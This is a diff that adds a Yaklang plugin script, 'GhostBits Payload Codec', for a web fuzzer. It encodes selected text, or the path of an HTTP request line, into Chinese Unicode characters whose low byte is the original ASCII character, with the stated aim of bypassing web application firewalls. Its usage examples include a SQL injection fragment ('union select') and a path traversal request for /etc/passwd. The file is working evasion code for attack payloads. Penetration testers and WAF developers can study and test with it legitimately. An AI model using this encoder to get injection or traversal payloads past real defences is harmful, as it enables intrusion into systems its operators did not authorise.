@@ -1,0 +1,237 @@
+__DESC__ = "GhostBits Payload Codec：将选中的文本一键编码为 Ghost Bits 中文 Unicode，绕过 WAF。"
+__VERBOSE_NAME__ = "GhostBits Payload Codec"
+__KEYWORDS__ = "ghostbits,ghost bits,codec,unicode,payload,mutate,waf bypass"
+
+// 中文优先候选池
+chinesePreferredHighBytes = [
+    0x4E, 0x5B, 0x6C, 0x7A,
+    0x80, 0x85, 0x90, 0x95,
+]
+
+// 扩展候选池
+extendedHighBytes = [
+    0x01, 0x02, 0x03,
+    0x04, 0x05,
+    0x06, 0x07,
+    0x09,
+    0x0E, 0x0F,
+    0x10, 0x11,
+    0x13,
+    0x2F,
+    0x30, 0x31, 0x32, 0x33,
+    0xA0, 0xA5,
+    0xAC, 0xB0,
+    0xC0, 0xD0,
+    0xFF,
+]
+
+// 保留空白字符和斜杠，其余 ASCII 全部编码
+shouldEncode = func(asciiCode /*int*/) {
+    if asciiCode < 0 || asciiCode > 127 {
+        return false
+    }
+    if asciiCode in [9, 10, 13, 32] {
+        return false
+    }
+    if asciiCode == 47 {
+        return false
+    }
+    return true
+}
+
+// 选取 Ghost Bits 字符
+pickGhostChar = func(asciiCode /*int*/, preferChinese /*bool*/, fixedHighByte /*int*/) {
+    selectedHighByte = fixedHighByte
+    if selectedHighByte <= 0 || selectedHighByte > 255 {
+        candidatePool = extendedHighBytes
+        if preferChinese {
+            candidatePool = chinesePreferredHighBytes
+        }
+        selectedHighByte = candidatePool[randn(0, len(candidatePool))]
+    }
+    return chr(selectedHighByte*256 + asciiCode)
+}
+
+// 编码字符串
+encodeGhostBits = func(text /*string*/, preferChinese /*bool*/, fixedHighByte /*int*/) {
+    result = ""
+    rawBytes = []byte(text)
+    for _, b = range rawBytes {
+        asciiCode = int(b)
+        if shouldEncode(asciiCode) {
+            result += pickGhostChar(asciiCode, preferChinese, fixedHighByte)
+        } else {
+            result += chr(int(b))
+        }
+    }
+    return result
+}
+
+// 查询单个字符的候选
+lookupGhostBits = func(ch /*string*/, preferChinese /*bool*/, fixedHighByte /*int*/) {
+    if ch == "" {
+        return "请输入单个字符"
+    }
+    asciiCode = ord(ch)
+    if asciiCode < 0 || asciiCode > 127 {
+        return "只支持 ASCII 字符（0x00–0xFF）"
+    }
+
+    lines = []
+    lines = append(lines, sprintf("字符：%s（0x%02X）", ch, asciiCode))
+    lines = append(lines, "------------------------------------------------")
+
+    if fixedHighByte > 0 && fixedHighByte <= 255 {
+        candidate = chr(fixedHighByte*256 + asciiCode)
+        lines = append(lines, sprintf("固定 highByte=0x%02X：%s  U+%04X", fixedHighByte, candidate, ord(candidate)))
+    } else {
+        poolName = "中文优先候选"
+        candidatePool = chinesePreferredHighBytes
+        if !preferChinese {
+            poolName = "扩展候选"
+            candidatePool = extendedHighBytes
+        }
+        lines = append(lines, sprintf("【%s】", poolName))
+        for _, highByte = range candidatePool {
+            candidate = chr(highByte*256 + asciiCode)
+            lines = append(lines, sprintf("  %s  U+%04X  high=0x%02X", candidate, ord(candidate), highByte))
+        }
+    }
+
+    return str.Join(lines, "\n")
+}
+
+// 判断是否为 HTTP 请求包
+looksLikeHTTPRequest = func(raw /*string*/) {
+    if raw == "" {
+        return false
+    }
+    firstLine = raw
+    endIdx = str.Index(raw, "\r\n")
+    if endIdx < 0 {
+        endIdx = str.Index(raw, "\n")
+    }
+    if endIdx >= 0 {
+        firstLine = raw[:endIdx]
+    }
+    if !str.Contains(firstLine, " HTTP/1.") && !str.Contains(firstLine, " HTTP/2") {
+        return false
+    }
+    methods = ["GET ", "POST ", "PUT ", "DELETE ", "HEAD ", "OPTIONS ", "PATCH "]
+    for _, m = range methods {
+        if str.HasPrefix(firstLine, m) {
+            return true
+        }
+    }
+    return false
+}
+
+// 智能编码 HTTP 请求包（只编码请求行的路径部分）
+mutateHTTPRequest = func(packet /*string*/, preferChinese /*bool*/, fixedHighByte /*int*/) {
+    firstLineEnd = str.Index(packet, "\r\n")
+    if firstLineEnd < 0 {
+        firstLineEnd = str.Index(packet, "\n")
+    }
+    if firstLineEnd < 0 {
+        return encodeGhostBits(packet, preferChinese, fixedHighByte)
+    }
+
+    firstLine = packet[:firstLineEnd]
+    rest = packet[firstLineEnd:]
+    parts = str.SplitN(firstLine, " ", 3)
+    if len(parts) != 3 {
+        return encodeGhostBits(packet, preferChinese, fixedHighByte)
+    }
+
+    method = parts[0]
+    target = parts[1]
+    version = parts[2]
+
+    encodedTarget = encodeGhostBits(target, preferChinese, fixedHighByte)
+    return method + " " + encodedTarget + " " + version + rest
+}
+
+// 从 JSON 解析配置（极简）
+loadConfig = func(raw /*string*/) {
+    cfg = {
+        "mode": "encode",
+        "text": raw,
+        "prefer_chinese": true,
+        "fixed_high_byte": 0,
+    }
+
+    trimmed = str.TrimSpace(raw)
+    if !str.HasPrefix(trimmed, "{") || !str.HasSuffix(trimmed, "}") {
+        return cfg
+    }
+
+    try {
+        parsed = json.loads(trimmed)
+        if parsed["mode"] != undefined {
+            cfg["mode"] = sprintf("%v", parsed["mode"])
+        }
+        if parsed["text"] != undefined {
+            cfg["text"] = sprintf("%v", parsed["text"])
+        }
+        if parsed["prefer_chinese"] != undefined {
+            v = parsed["prefer_chinese"]
+            cfg["prefer_chinese"] = v == true || v == "true" || v == "1"
+        }
+        if parsed["fixed_high_byte"] != undefined {
+            try {
+                cfg["fixed_high_byte"] = parseInt(sprintf("%v", parsed["fixed_high_byte"]))
+            } catch _ {}
+        }
+    } catch _ {}
+
+    return cfg
+}
+
+renderUsage = func() {
+    return `GhostBits Payload Codec
+
+用法：在 WebFuzzer 中选中任意文本 → 右键执行
+
+默认行为：
+- 选中文本 → 直接 Ghost Bits 编码（中文 Unicode）
+- 选中单个字符 → 显示候选列表
+- 选中 HTTP 请求包 → 只编码请求行路径
+
+高级 JSON 配置示例：
+{"mode":"lookup","text":"."}
+{"mode":"encode","text":"union select","fixed_high_byte":78}
+{"mode":"http_request","text":"GET /../../etc/passwd HTTP/1.1\r\nHost: a\r\n\r\n"}
+
+支持字段：
+- mode: encode | lookup | http_request
+- text: 要处理的文本
+- prefer_chinese: true | false（默认 true）
+- fixed_high_byte: 1-255，0 表示随机`
+}
+
+handle = func(p) {
+    raw = string(p)
+    if str.TrimSpace(raw) == "" {
+        return renderUsage()
+    }
+
+    cfg = loadConfig(raw)
+    mode = str.ToLower(str.TrimSpace(sprintf("%v", cfg["mode"])))
+    text = sprintf("%v", cfg["text"])
+    preferChinese = cfg["prefer_chinese"]
+    fixedHighByte = cfg["fixed_high_byte"]
+
+    if mode == "lookup" {
+        lookupText = text
+        if len([]byte(lookupText)) > 1 {
+            lookupText = string([]byte(lookupText)[0])
+        }
+        return lookupGhostBits(lookupText, preferChinese, fixedHighByte)
+    }
+
+    if mode == "http_request" || looksLikeHTTPRequest(text) {
+        return mutateHTTPRequest(text, preferChinese, fixedHighByte)
+    }
+
+    return encodeGhostBits(text, preferChinese, fixedHighByte)
+}
